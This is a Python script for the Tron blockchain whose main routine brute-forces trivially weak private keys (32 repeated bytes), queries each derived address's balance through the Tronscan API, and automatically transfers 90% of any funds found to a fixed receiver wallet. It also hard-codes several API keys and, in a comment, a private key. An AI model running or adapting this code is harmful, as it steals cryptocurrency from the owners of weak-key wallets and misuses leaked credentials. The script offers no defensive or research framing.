import logging
import time
import random
import requests

from threading import Thread


from requests import HTTPError
from tronpy import Tron
from tronpy.exceptions import ValidationError
from tronpy.keys import PrivateKey

from wallets.models.walllet import Wallet


def create_wallet() -> Wallet:
    private_key = PrivateKey.random()
    address = private_key.public_key.to_base58check_address()
    return Wallet(address, str(private_key), "tron")


def send_transaction(private_key: str, address: str, amount: float) -> None:
    int_amount = int(amount * 1000000)
    client = Tron()
    key = PrivateKey(bytes.fromhex(f"{private_key}"))
    for _ in range(10):
        try:
            client.trx.transfer(
                from_=key.public_key.to_base58check_address(),
                to=address,
                amount=int_amount
            ).build().sign(key).broadcast()
            break
        except HTTPError as e:
            time.sleep(1)
            logging.warning(e)
        except ValidationError as e:
            logging.warning(e)
            return


def force_script(receiver_wallet: str):
    api_keys_pool = [
        "fe4b78b3-c245-4052-bacd-b1911bec9d7b",
        "136298a3-63e1-4c93-ac3c-7e23b9a64808",
        "037ad00b-1970-4a5a-8478-f6a3e31de9f2"
    ]
    ready_accounts = []
    while True:
        try:
            for i in range(1, 255):
                key = bytes([i for _ in range(32)])
                private_key = PrivateKey(key)
                address = private_key.public_key.to_base58check_address()
                logging.info(address)
                response = requests.request(
                    method="GET",
                    headers={
                        "TRON-PRO-API-KEY": random.choice(api_keys_pool)
                    },
                    url=f"https://apilist.tronscanapi.com/api/accountv2?address={address}"
                )
                balance = response.json().get('balance')
                # print(f"{address} | {balance / 1000000} TRX")

                if balance > 0.0:
                    try:
                        print(f"Found {balance / 1000000} TRX on {address} | Private key: {str(private_key)}")
                        send_transaction(str(private_key), receiver_wallet, balance - 0.1*balance)
                    except Exception:
                        ready_accounts.append(str(private_key))
            print(ready_accounts)
            break
        except Exception as e:
            pass
    pass


if __name__ == "__main__":
    # wallet = create_wallet()
    # print(wallet)
    # send_transaction(
    #     private_key="0b38d3e5c2378f2ddbfb7749b8b6a2ab1acbf5a3f9243f85800c9481295c82ae",
    #     address="TGBNaAkjVex8FGamyD2CQzEWtXouttsAdE",
    #     amount=0.5
    # )

    threads = []
    force_script("TGBNaAkjVex8FGamyD2CQzEWtXouttsAdE")
    # for _ in range(2):
    #     threads.append(
    #         Thread(target=force_script, args=["TGBNaAkjVex8FGamyD2CQzEWtXouttsAdE"])
    #     )
    #
    # for thread in threads:
    #     thread.start()
